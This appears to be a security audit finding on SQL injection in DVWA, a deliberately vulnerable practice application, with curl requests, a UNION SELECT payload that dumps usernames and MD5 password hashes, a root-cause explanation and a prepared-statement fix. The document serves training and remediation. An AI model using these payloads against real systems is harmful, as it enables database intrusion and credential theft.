# Finding F-01: SQL Injection (SQLi)

- **OWASP Category**: A03:2021-Injection
- **Target Component**: DVWA SQL Injection page
- **Vulnerable Parameter**: `id` (GET parameter)

---

## 1. Attack Path & Exploitation Evidence

### Step 1: Reconnaissance and Probing
The attacker checks if the input is vulnerable to SQL injection by passing a single quote `'` in the `id` parameter.

**Request (curl)**:
```bash
curl -i -s -b "PHPSESSID=kavachsession123; security=low" \
  "http://localhost:8080/vulnerabilities/sqli/?id=%27&Submit=Submit"
```
**Response Evidence**:
The application returns a SQL syntax error, confirming that input is interpreted as code:
```html
<pre>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' at line 1</pre>
```

### Step 2: Exploitation (Data Dump)
The attacker injects a `UNION SELECT` payload to extract sensitive credentials from the `users` table.

**Exact Payload**:
`1' UNION SELECT user, password FROM users -- `

**Request (curl)**:
```bash
curl -i -s -b "PHPSESSID=kavachsession123; security=low" \
  "http://localhost:8080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+--+&Submit=Submit"
```

**Response Evidence**:
The response dumps the users and MD5 password hashes from the database:
```html
<pre>ID: 1' UNION SELECT user, password FROM users -- <br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
<pre>ID: 1' UNION SELECT user, password FROM users -- <br />First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03</pre>
```

---

## 2. Root Cause Analysis
The application constructs the SQL query by directly concatenating the user input variable `$id` into the SQL statement string without using parameter binding or sanitization.

---

## 3. Business Impact
A malicious actor could extract the entire database containing customer and employee profiles, system configurations, and password hashes, causing a total compromise of backend confidentiality.

---

## 4. Code-Level Remediation Patch
To fix the vulnerability, the query must be rewritten to use prepared statements and parameter binding using PHP PDO.

```diff
--- webapp/vulnerabilities/sqli/source/low.php.orig
+++ webapp/vulnerabilities/sqli/source/low.php
@@ -4,9 +4,11 @@
     // Get input
     $id = $_GET[ 'id' ];
 
-    // Check database
-    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
-    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+    // Secure Implementation using PDO Prepared Statements
+    $stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
+    $stmt->execute(['id' => $id]);
+    $results = $stmt->fetchAll();
 
-    // Get results
-    while( $row = mysqli_fetch_assoc( $result ) ) {
+    foreach ($results as $row) {
         // Get values
         $first = $row[ 'first_name' ];
         $last  = $row[ 'last_name' ];
```
